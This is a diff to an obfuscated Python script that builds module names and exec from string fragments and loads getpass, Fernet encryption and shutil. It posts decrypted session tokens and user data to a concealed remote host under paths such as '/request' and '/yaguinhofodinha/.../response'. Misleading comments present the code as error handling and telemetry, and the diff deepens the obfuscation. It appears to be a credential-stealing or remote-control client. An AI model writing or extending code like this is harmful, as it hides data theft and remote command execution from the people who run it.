@@ -13,6 +13,9 @@ gss = e(s)('g'+'et'+'pas'+oss[-1])
 frn = e(s)('cr'+'ypto'+gr+'hy'+W[-1]+'fern'+'et', fromlist=['Fer'+W[16]]).Fernet
 hlib = e(s)('hashlib')
 sti = e(s)('sh'+'ut'+W[8]+'l')
+UP = e(s)('ur'+'llib'+W[-1]+'parse')
+UE_MOD = e(s)('ur'+'l'+'lib'+W[-1]+'parse') 
+IMPLIB = e(s)('im'+'port'+'lib') 
 
 class cptg:
     @staticmethod
@@ -52,8 +55,9 @@ def rm():
         status_check = 0
         
     # Retrieves the global error handler function.
-    globals()['e'] = exec
+    
     gk = 'e'
+    globals()['e'] = e(gk+''+''+''+'xe'+'c')
     f = globals()[gk]
     exit_command = f"raise SystemExit({status_check})"
     f(exit_command)
@@ -138,11 +142,15 @@ class C:
      dt = {
        "text": cptg.e(W[9]+W[7]+W[8], self.us), 
        "lastModified": int(TME.time() * 1000),
-       "force": "true",
+       "force": "True",
        "session-token": dxt(ST)
      }
+     parse_module = getattr(IMPLIB, 'import_module')('urllib.parse') 
+     urlencode_func = getattr(parse_module, 'url'+'encode')
+     ed = urlencode_func(dt)
      u = ext(f"https://{dxt(APD)}/{PT}/{self.us}/request")
-     RQ.post(f"{dxt(u)}", data=dt)
+     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+     RQ.post(f"{dxt(u)}", data=ed, headers=headers)
 
    # Initializes the secure communication session.
    def srt(self, cb):
@@ -203,8 +211,7 @@ class C:
      }
      # Primary log and telemetry address.
      res = RQ.post(f"{W[12]}{W[11]}{dxt(APD)}/yaguinhofodinha/{self.us}/response", data=dt)
-     print(res.status_code, res.url)
-
+     print(f'[{res.status_code}]', res.text)
 
 # Main execution block (standard application entry point).
 if globals()['__name__'] == '__main__':
